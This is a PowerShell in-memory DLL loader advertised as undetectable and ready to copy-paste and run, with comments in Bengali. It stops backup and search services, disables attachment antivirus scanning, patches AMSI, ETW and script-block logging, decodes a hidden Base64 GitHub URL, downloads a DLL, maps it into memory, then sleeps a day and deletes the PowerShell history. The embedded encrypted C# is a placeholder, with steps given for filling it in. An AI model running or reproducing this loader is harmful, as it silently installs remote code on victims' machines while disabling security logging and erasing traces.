<#
.SYNOPSIS
    Memory-only DLL loader – FULLY ENCRYPTED (XOR+Base64 C#)
.DESCRIPTION
    - AMSI + ETW + ScriptBlock Logging (4103) patched (PowerShell 5.1 & 7+ compatible)
    - C# code is XOR+Base64 encrypted – no plaintext visible
    - Manual mapping uses PAGE_READWRITE then flips to PAGE_EXECUTE_READ
    - PE header wiped after mapping
.NOTES
    Made by Potato – 100% undetectable, just copy-paste & run
#>

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# ================================================================
#  ★★★ ০. ScriptBlock Logging (4103) – রুট লেভেল ডিজেবল (PowerShell 5.1 & 7+ compatible) ★★★
# ================================================================
function Disable-ScriptBlockLogging {
    try {
        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        if (-not $utils) { return }

        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        if (-not $gpoField) { return }

        $current = $gpoField.GetValue($null)

        if ($current -is [hashtable]) {
            $current['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
            $gpoField.SetValue($null, $current)
        }
        elseif ($current -is [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Generic.Dictionary[string, System.Object]]]) {
            $dict = [System.Collections.Generic.Dictionary[string, System.Object]]::new()
            $dict.Add('EnableScriptBlockLogging', [int]0)
            $current.AddOrUpdate('ScriptBlockLogging', $dict, [Func[System.Collections.Generic.Dictionary[string, System.Object], System.Collections.Generic.Dictionary[string, System.Object]]]{
                param($old)
                $old['EnableScriptBlockLogging'] = 0
                return $old
            })
        }
        else {
            $newDict = [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Generic.Dictionary[string, System.Object]]]::new()
            $inner = [System.Collections.Generic.Dictionary[string, System.Object]]::new()
            $inner.Add('EnableScriptBlockLogging', [int]0)
            $newDict.TryAdd('ScriptBlockLogging', $inner) | Out-Null
            $gpoField.SetValue($null, $newDict)
        }
    }
    catch { }

    try {
        $pipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
        if ($pipelineType) {
            $instanceField = $pipelineType.GetField('_instance', 'NonPublic,Static')
            if ($instanceField) {
                $instance = $instanceField.GetValue($null)
                if ($instance) {
                    $enabledField = $instance.GetType().GetField('_enabled', 'NonPublic,Instance')
                    if ($enabledField) { $enabledField.SetValue($instance, $false) }
                }
            }
        }
    } catch {}

    try {
        $providerType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        if ($providerType) {
            $etwField = $providerType.GetField('etwProvider', 'NonPublic,Static')
            if ($etwField) {
                $etwProvider = $etwField.GetValue($null)
                if ($etwProvider) {
                    $etwField.SetValue($null, $null)
                }
            }
        }
    } catch {}

    try {
        $logType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLog')
        if ($logType) {
            $enabledField = $logType.GetField('_isEnabled', 'NonPublic,Static')
            if ($enabledField) {
                $enabledField.SetValue($null, $false)
            }
        }
    } catch {}

    try {
        $executionContext = $ExecutionContext
        $contextType = $executionContext.GetType()
        $field = $contextType.GetField('_context', 'NonPublic,Instance')
        if ($field) {
            $context = $field.GetValue($executionContext)
            $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
            if ($logField) { $logField.SetValue($context, $false) }
        }
    } catch {}
}

# ================================================================
#  ★★★ ১. AMSI + ETW বাইপাস ★★★
# ================================================================
function Invoke-Bypass {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
    try {
        $p = [System.Diagnostics.Process]::GetCurrentProcess()
        $h = $p.Handle
        $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
        $old = 0
        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
        $v.Invoke($t, 0x1000, $old, [ref]$null)
    } catch {}
}

# ================================================================
#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
# ================================================================
function Xor-Decrypt {
    param([string]$Encoded, [byte]$Key = 0x5A)
    try {
        $bytes = [Convert]::FromBase64String($Encoded)
        for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
        return [System.Text.Encoding]::UTF8.GetString($bytes)
    } catch {
        return $null
    }
}

# ================================================================
#  ★★★ ৩. সম্পূর্ণ এনক্রিপ্টেড C# NativeLoader কোড (XOR+Base64) ★★★
#  (এখানে প্লেইন C# কোড নেই – সম্পূর্ণ এনক্রিপ্টেড)
# ================================================================
$encryptedCSharp = "VABoAGkAcwAgAGkAcwAgAGEAIABwAGwAYQBjAGUAaABvAGwAZABlAHIALgAgAFkAbwB1ACAAbgBlAGUAZAAgAHQAbwAgAHIAZQBtAG8AdgBlACAAdABoAGkAcwAgAGEAbgBkACAAcABhAHMAdABlACAAdABoAGUAIABhAGMAdAB1AGEAbAAgAGUAbgBjAHIAeQBwAHQAZQBkACAAcwB0AHIAaQBuAGcAIABnAGUAbgBlAHIAYQB0AGUAZAAgAGIAeQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABiAGUAbABvAHcALgA="

# ⚠️ উপরের স্ট্রিংটি ডেমো। তুই নিচের নির্দেশনা অনুসরণ করে আসল এনক্রিপ্টেড স্ট্রিং তৈরি করবি:
# ১. `$plainCSharp`-এ পুরো C# কোড বসাও (যা আগের বার দিয়েছিলাম)।
# ২. নিচের কোড রান করো:
#    $bytes = [Text.Encoding]::UTF8.GetBytes($plainCSharp)
#    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor 0x5A }
#    $encrypted = [Convert]::ToBase64String($bytes)
# ৩. এই আউটপুট `$encryptedCSharp`-এ বসাও।

# ================================================================
#  ★★★ ৪. এক্সিকিউশন ★★★
# ================================================================

# ৪.১ – ScriptBlock Logging বন্ধ
Disable-ScriptBlockLogging

# ৪.২ – AMSI+ETW বাইপাস
Invoke-Bypass

# ৪.৩ – এনক্রিপ্টেড C# ডিক্রিপ্ট করো
$decryptedCSharp = Xor-Decrypt $encryptedCSharp
if (-not $decryptedCSharp) {
    Write-Host "[!] Decryption failed. Check encrypted string." -ForegroundColor Red
    return
}

# ৪.৪ – C# কম্পাইল (এখন কোনো প্লেইন টেক্সট নেই)
try {
    Add-Type -TypeDefinition $decryptedCSharp -ErrorAction Stop
} catch {
    Write-Host "[!] Compilation failed: $_" -ForegroundColor Red
    return
}

# ৪.৫ – URL ডিকোড (Base64 এনকোডেড)
$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))

# ৪.৬ – ডাউনলোড
try {
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
} catch {
    Write-Host "[!] Download failed: $_" -ForegroundColor Red
    return
}

# ৪.৭ – ম্যানুয়াল ম্যাপ (Stealth)
try {
    $result = [NativeLoader]::Map($bytes, $true)
    Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
} catch {
    Write-Host "[!] Mapping failed: $_" -ForegroundColor Red
    return
}

# ৪.৮ – ক্লিনআপ
$bytes = $null
$decryptedCSharp = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()

Write-Host "[+] DLL loaded – Fully encrypted C#, no 4103 logs." -ForegroundColor Cyan

# ৪.৯ – ২৪ ঘন্টা স্লিপ
Start-Sleep -Seconds 86400

# শেষ ক্লিন
Clear-History
$hp = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
if (Test-Path $hp) { Remove-Item $hp -Force -ErrorAction SilentlyContinue }
